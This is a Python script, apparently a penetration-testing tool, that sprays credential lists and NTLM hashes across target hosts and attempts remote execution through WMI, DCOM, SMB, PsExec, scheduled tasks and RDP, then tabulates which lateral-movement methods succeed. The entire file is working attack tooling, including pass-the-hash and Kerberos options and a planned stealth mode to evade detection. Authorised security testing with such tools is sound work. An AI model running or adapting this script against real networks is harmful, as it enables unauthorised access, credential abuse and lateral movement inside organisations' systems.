#!/usr/bin/python3

from modules.wmiexec import WMIEXEC
from modules.dcomexec import DCOMEXEC
from modules.smbexec import CMDEXEC
from modules.psexec import PSEXEC
from modules.atexec import TSCH_EXEC
from modules.rdp_check import RDPCHECK
from prettytable import PrettyTable
import argparse
import sys

#Notes:
# * Changed timeout for all modules (except for ATExec) to 25 seconds. If there is enough interest I may explore adding
#       timeout as an argument
# * RDP "SSL routines, wrong ssl version" - This happens on older systems and might wrongly indicate RDP is not usable on a host. If this error occurs try RDP on some of the hosts.
# STATUS:
# To Do:
# * Fix RDP wrong SSL Version
# * Logging and color? - Only real test left.
# * Kerberos not testing (need make change to test lab)
# * Feature enhancements:
#   * Different spray methods? E.G stealth mode that randomizes the IP and does it slowly.
#   * Add more arguments? Might be: RemComSVC alernative executable file, SMBexec server mode, SMB port 139 or 445
#   * Debugging/verbosity options?


# WMIEXEC - working
# wmiexec(' '.join(options.command), username, password, domain, options.hashes, options.aesKey, options.share, options.nooutput, options.k, options.dc_ip)
def wmiexec(address, username, password, domain, hashes, share, aesKey=None, k=False, dc_ip=None):
    wmiexecm = WMIEXEC(' ', username, password, domain, hashes, aesKey, share, False, k, dc_ip)
    try:
        wmiexecm.run(address)
    except Exception as e:
        print("\tWMI Exec failed")
        print("\terror is: %s" % e)
        return 0

    if wmiexecm.shell is not None:
        print("\tWMI Exec was success")
        return 1
    else:
        print("\tWMI Exec failed")
        return 0

# DCOMEXEC - WORKING - Required OBJECT to be set. only works when an admin is logged into the machine
# dcomexec(' '.join(options.command), username, password, domain, options.hashes, options.aesKey, options.share, options.nooutput, options.k, options.dc_ip, options.object)
def dcomexec(address, username, password, domain, hashes, share, aesKey=None, k=False, dc_ip=None, object='ShellWindows'):
    dcomexecm = DCOMEXEC('whoami', username, password, domain, hashes, aesKey, share, False, k, dc_ip, object)
    try:
        dcomexecm.run(address)
    except Exception as e:
        print("\tDCOM Exec failed")
        print("\terror is: %s" % e)
        return 0

    if dcomexecm.shell is not None:
        print("\tDCOM Exec was success")
        return 1
    else:
        print("\tDCOM Exec failed")
        return 0
      # Errors:
      # bad creds: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
      # IP not available: [Errno Connection error (172.66.10.2:445)] [Errno 113] No route to host
      # Share doesn't exist: ERROR:root:DCOM SessionError: code: 0x8000401a - CO_E_RUNAS_LOGON_FAILURE - The server process could not be started because the configured identity is incorrect. Check the user name and password.


# SMBEXEC - NEED TO SPECIFY THE MODE. - 2 modes SERVER MODE and SHARE MODE (specify options.mode = NONE for this then specify the share (typically ADMIN$)). check smbexec.py for more dets.
# CMDEXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, options.mode, options.share, int(options.port))
def smbexec(address, username, password, domain, hashes, share, aesKey=None, k=False, dc_ip=None):
    smbexecm = CMDEXEC(username, password, domain, hashes, aesKey, k, dc_ip, 'SHARE', share, 445)
    try:
        smbexecm.run(address, address)
    except Exception as e:
        print("\tSMB Exec failed")
        print("\terror is: %s" % e)
        return 0

    if smbexecm.shell is not None:
        print("\tSMB Exec was success")
        return 1
    else:
        print("\tSMB Exec failed")
        return 0

# PSEXEC Requires a service name to be specified!
# PSEXEC(command, options.path, options.file, options.c, int(options.port), username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, options.service_name) (k= kerberos, aesKey = for kerberos)
def psexec(address, username, password, domain, hashes, aesKey=None, k=False, dc_ip=None):
    psexecm = PSEXEC(' ', None, None, None, 445, username, password, domain, hashes, aesKey, k, dc_ip, 'AAAABBBB')
    try:
      psexecm.run(address, address)
    except Exception as e:
        print("\tPS Exec failed")
        print("\terror is: %s" % e)
        return 0

    if psexecm.shell is not None:
        print("\tPS Exec was success")
        return 1
    else:
        print("\tPS Exec failed")
        return 0

# ATEXEC - WORKING!
# TSCH_EXEC(username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip, ' '.join(options.command))
def atexec(address, username, password, domain, hashes, aesKey=None, k=False, dc_ip=None):
    atexecm = TSCH_EXEC(username, password, domain, hashes, aesKey, k, dc_ip, 'whoami')
    try:
        atexecm.play(address)
    except Exception as e:
        print("\tATExec failed")
        print("\terror is: %s" % e)
        return 0

    if atexecm.shell is not None:
        print("\tATExec was success")
        return 1
    else:
        print("\tATExec failed")
        return 0


# RDP-Check
# check_rdp(address, username, password, domain, hashes)
def rdpcheck(address, username, password, domain, hashes):
    rdpcheckm = RDPCHECK(username, password, domain, hashes)
    try:
        rdpcheckm.run(address)
    except Exception as e:
        print("\tRDP Check failed")
        print("\terror is: %s" % e)
        return 0

    if rdpcheckm.shell is not None:
        print("\tRDP_CHECK was success")
        return 1
    else:
        print("\tRDP Check failed")
        return 0


def performchecks(address, username, password, domain, hash, share, aesKey, k, dc_ip, object, checks):
    checkResult = {}
    print("Performing checks against: %s" % address)
    if len(checks) == 0:
        checkResult["rdp"] = rdpcheck(address, username, password, domain, hash)
        checkResult["dcom"] = dcomexec(address, username, password, domain, hash, share, aesKey, k, dc_ip, object)
        checkResult["wmi"] = wmiexec(address, username, password, domain, hash, share, aesKey, k, dc_ip)
        checkResult["smb"] = smbexec(address, username, password, domain, hash, share, aesKey, k, dc_ip)
        checkResult["ps"] = psexec(address, username, password, domain, hash, aesKey, k, dc_ip)
        checkResult["at"] = atexec(address, username, password, domain, hash, aesKey, k, dc_ip)
    else:
        if 'rdp' in checks:
            checkResult["rdp"] = rdpcheck(address, username, password, domain, hash)
        if 'dcom' in checks:
            checkResult["dcom"] = dcomexec(address, username, password, domain, hash, share, aesKey, k, dc_ip, object)
        if 'wmi' in checks:
            checkResult["wmi"] = wmiexec(address, username, password, domain, hash, share, aesKey, k, dc_ip)
        if 'smbexec' in checks:
            checkResult["smb"] = smbexec(address, username, password, domain, hash, share, aesKey, k, dc_ip)
        if 'psexec' in checks:
            checkResult["ps"] = psexec(address, username, password, domain, hash, aesKey, k, dc_ip)
        if 'atexec' in checks:
            checkResult["at"] = atexec(address, username, password, domain, hash, aesKey, k, dc_ip)
    return checkResult


if __name__ == '__main__':

    parser = argparse.ArgumentParser(add_help=True, description="Spray your creds and hashes to multiple lateral movement techniques.")

    parser.add_argument('-o', "--output", action='store', help='File to save results to.')

    group = parser.add_argument_group('connectivity')
    group.add_argument('-t', "--target", action='store', help='ip address or hostname')
    group.add_argument('-T', "--targets", action='store', help='file containing IP addresses or hostnames, one on each line')
    group.add_argument('-dc-ip', action='store', metavar="ip address",
                   help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                        'the target parameter')

    group = parser.add_argument_group('authentication')

    group.add_argument('-u', '--user', action='store', help='username')
    group.add_argument('-p', '--password', action='store', help='password')
    group.add_argument('-d', '--domain', action='store', help='Domain name. Leave blank for local logins.')
    group.add_argument('-C', '--creds', action='store',
                     help='file containing colon separated "username:password" format, instead of -u/-p options. '
                          'One cred pair on each line. -d still required for domain creds.')
    group.add_argument('-hash', action="store", metavar="LMHASH:NTHASH", help='NTLM hash, format is LMHASH:NTHASH')
    group.add_argument('-hashes', action="store", metavar="username:LMHASH:NTHASH",
                     help='file containing colon separate "username:LMHASH:NTHASH" format instead of -u/-h options. '
                          'One cred pair on each line. -d still required for domain creds')
    group.add_argument('-aesKey', action='store', metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                   '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                                                   'ones specified in the command line')

    group = parser.add_argument_group('Testing Options - By default all checks are performed.')
    group.add_argument('-rdp', action='store_true', help='RDP checks')
    group.add_argument('-dcom', action='store_true', help='DCOMExec checks')
    group.add_argument('-wmi', action='store_true', help='WMIExec checks')
    group.add_argument('-smbexec', action='store_true', help='SMBExec checks')
    group.add_argument('-psexec', action='store_true', help='PSExec checks')
    group.add_argument('-atexec', action='store_true', help='ATExec checks')

    group = parser.add_argument_group('Advanced Settings')
    group.add_argument('-share', action='store', help='For DCOM, WMI and SMB exec. ADMIN$ is default share.'
                                                      'Specify this if you wish to try an alternative share, such as C$.')
    parser.add_argument('-object', choices=['ShellWindows', 'ShellBrowserWindow', 'MMC20'], nargs='?',
                        help='DCOM object to be used with DCOM test. default=ShellWindows')

    options = parser.parse_args()

    '''
    Check arguments to ensure required arguments have been provided, and that no conflicting arguments have been specified.
    '''
    if len(sys.argv)==1:
      parser.print_help()
      sys.exit(1)

    # Check if target information is provided.
    if options.target is None and options.targets is None:
        print("No targets provided. Please specify if -t or -T.")
        parser.print_help()
        sys.exit(1)
    elif options.target is not None and options.targets is not None:
        print("Conflicting arguments provided. Please provide a single target or list of targets.")
        sys.exit(1)

    # Check if credential information is provided.
    # If not username, password, hashes or cred file is provided, error as there is no login info.
    if options.user is None and options.password is None and options.hash is None and options.creds is None and options.hashes is None:
        print("No credentials provided. Please specify -u with -p or -hash. Or use -C or -hashes")
        parser.print_help()
        sys.exit(1)
    # Check if conflicting credential arguments have been provided
    elif (options.user is not None and (options.password is not None or options.hash is not None)) and (options.creds is not None or options.hashes is not None):
        print("Conflicting arguments provided. User (-u) or Password (-p) cannot be specified when -C or -hashes is specified.")
        sys.exit(1)
    # If username or password/hash is not provided and credential pairs are not provided, error as not enough credential info provided.
    elif (options.user is None and (options.password is None or options.hash is None)) and options.creds is None and options.hashes is None:
        print("Insufficient authentication parameters provided. Please specify a username with a password of hash, Or file with credential pairs using -C or -hashes")

    '''
    Setup variables 
    '''
    if options.domain is None:
        options.domain = ''

    if options.aesKey is not None:
        options.k = True

    if options.password is None:
        options.password = ''

    if options.share is None:
        options.share = 'ADMIN$'

    if options.object is None:
        options.object = 'ShellWindows'

    checks = []
    if options.rdp:
        checks.append('rdp')
    if options.dcom:
        checks.append('dcom')
    if options.wmi:
        checks.append('wmi')
    if options.smbexec:
        checks.append('smbexec')
    if options.psexec:
        checks.append('psexec')
    if options.atexec:
        checks.append('atexec')

    '''
    Execution of the test cases
    '''
    checkResults = {}
    # If target file was provided load into the targets list and begin testing
    if options.targets is not None:
        with open(options.targets) as targetF:
            targets = targetF.read().splitlines()
        targetF.close()

        # If cred pairs were provided load into the creds list or hashes list respectively for testing.
        if options.creds is not None or options.hashes is not None:
            if options.creds is not None:
                with open(options.creds) as targetC:
                    creds = targetC.read().splitlines()
                targetC.close()

                # Loop over targets and creds to test!
                for host in targets:
                    checkResults[host] = {}
                    for cred in creds:
                        checkResults[host].update({cred.split(":",1)[0]: performchecks(host, cred.split(":",1)[0], cred.split(":",1)[1], options.domain, options.hash, options.share, options.aesKey, options.k, options.dc_ip, options.object, checks)})

            elif options.hashes is not None:
                with open(options.hashes) as targetH:
                    hashes = targetH.read().splitlines()
                targetH.close()
                print(hashes)
                # Loop over targets and creds to test!
                for host in targets:
                    checkResults[host] = {}
                    for hash in hashes:
                        checkResults[host].update({hash.split(":",1)[0]: performchecks(host, hash.split(":",1)[0], options.password, options.domain, hash.split(":",1)[1], options.share, options.aesKey, options.k, options.dc_ip, options.object, checks)})

        # If cred pairs were not provided try only 1 pair of creds
        elif options.password is not None or options.hash is not None:
            for host in targets:
                checkResults[host] = {options.user: performchecks(host, options.user, options.password, options.domain, options.hash, options.share, options.aesKey, options.k, options.dc_ip, options.object, checks)}

    # Else if target file was not provided
    else:
        # If cred pairs were provided load into the creds list or hashes list respectively.
        checkResults[options.target] = {}
        if options.creds is not None or options.hashes is not None:
            if options.creds is not None:
                with open(options.creds) as targetC:
                    creds = targetC.read().splitlines()
                targetC.close()
                # Loop over creds to test!
                for cred in creds:
                    checkResults[options.target].update({cred.split(":",1)[0]: performchecks(options.target, cred.split(":",1)[0], cred.split(":",1)[1], options.domain, options.hash, options.share, options.aesKey, options.k, options.dc_ip, options.object, checks)})

            elif options.hashes is not None:
                with open(options.hashes) as targetH:
                    hashes = targetH.read().splitlines()
                targetH.close()
                # Loop over creds to test!
                for hash in hashes:
                    checkResults[options.target].update({hash.split(":", 1)[0]: performchecks(options.target, hash.split(":", 1)[0], options.password, options.domain, hash.split(":", 1)[1], options.share, options.aesKey, options.k, options.dc_ip, options.object, checks)})
        # If cred pairs were not provided try only 1 pair of creds
        else:
            checkResults[options.target].update({options.user: performchecks(options.target, options.user, options.password, options.domain, options.hash, options.share, options.aesKey, options.k, options.dc_ip, options.object, checks)})

    '''
    Testing done, print results and calculate totals
    '''

    topHost = next(iter(checkResults))
    topCred = next(iter(checkResults[topHost]))
    tableHead = ['IP', 'User'] + [*checkResults[topHost][topCred]]

    t = PrettyTable(tableHead)
    rdpSum = 0
    dcomSum = 0
    wmiSum = 0
    smbSum = 0
    psSum = 0
    atSum = 0

    for host, creds in checkResults.items():
        hostCount = 0
        for cred, check in creds.items():
            #print([cred] + [v for v in check.values()])
            if hostCount == 0:
                t.add_row([host, cred] + [bool(int(v)) for v in check.values()])
            else:
                t.add_row(['', cred] + [bool(int(v)) for v in check.values()])

            hostCount += 1

            # Count
            if check and 'rdp' in check.keys():
                rdpSum += check['rdp']
            if check and 'dcom' in check.keys():
                dcomSum += check['dcom']
            if check and 'wmi' in check.keys():
                wmiSum += check['wmi']
            if check and 'smb' in check.keys():
                smbSum += check['smb']
            if check and 'ps' in check.keys():
                psSum += check['ps']
            if check and 'at' in check.keys():
                atSum += check['at']

    if len(checks) == 0:
        t.add_row(['=', '=', '=', '=', '=', '=', '=', '='])
        t.add_row(['Total', '=', rdpSum, dcomSum, wmiSum, smbSum, psSum, atSum])
    else:
        borderRow = ['=', '=']
        totalRow = ['Totals','=']
        for check in checks:
            borderRow.append('=')
            if check == 'rdp':
                totalRow.append(rdpSum)
            elif check == 'dcom':
                totalRow.append(dcomSum)
            elif check == 'wmi':
                totalRow.append(wmiSum)
            elif check == 'smb':
                totalRow.append(smbSum)
            elif check == 'ps':
                totalRow.append(psSum)
            elif check == 'at':
                totalRow.append(atSum)
        t.add_row(borderRow)
        t.add_row(totalRow)
    print(t)

    if options.output is not None:
        table_txt = t.get_string()
        with open(options.output, "w+") as file:
            file.write(table_txt)
            file.write("\n")







